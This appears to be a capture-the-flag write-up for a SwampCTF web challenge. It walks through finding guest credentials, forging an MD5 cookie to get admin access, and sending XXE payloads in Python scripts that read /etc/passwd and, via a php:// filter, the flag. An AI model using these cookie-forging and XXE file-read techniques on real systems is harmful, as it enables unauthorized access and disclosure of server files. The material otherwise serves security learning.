# Swamp Tech Solutions

## Approach

### Explore

An admin page `/adminpage.php` is found in the `robots.txt` file; guest credentials `guest:iambutalowlyguest` are found in the page source.

Login with the credentials, and find cookie `user=084e0343a0486ff05530df6c705c8bb4`, which is the MD5 hash of `guest`. We can change it to `21232f297a57a5a743894a0e4a801fc3`, which is the MD5 hash of `admin`, to get admin privileges.

In the admin page, there's a hidden form `xmlForm`, which posts some XML data to `/process.php`.

### Exploit

Let's try XXE:

```python
import requests

url = "http://chals.swampctf.com:40043/process.php"

xml = """
<!DOCTYPE root [
    <!ENTITY fileContents SYSTEM "file:///etc/passwd">
]>
<root>
<name>&fileContents;</name>
<email>1</email>
</root>
"""
resp = requests.post(url, data={"submitdata": xml})

print(resp.text)
```

It works! However, when I try to access `/var/www/html/flag.txt`, the server raises an error (not sure for the reason here). Then I tried `php://`:

```python
import requests

url = "http://chals.swampctf.com:40043/process.php"

xml = """
<!DOCTYPE root [
<!ENTITY fileContents SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt">
]>
<root>
<name>&fileContents;</name>
<email>1</email>
</root>
"""

resp = requests.post(url, data={"submitdata": xml})

print(resp.text)

# <h3>Thank you for actually doing your work, c3dhbXBDVEZ7VzByazFOZ19DSDQxTDVfPHI+X0Z1Tn0K. You're safe for now...</h3>
# swampCTF{W0rk1Ng_CH41L5_<r>_FuN}
```

We get the Base64 encoded flag ~ \o/
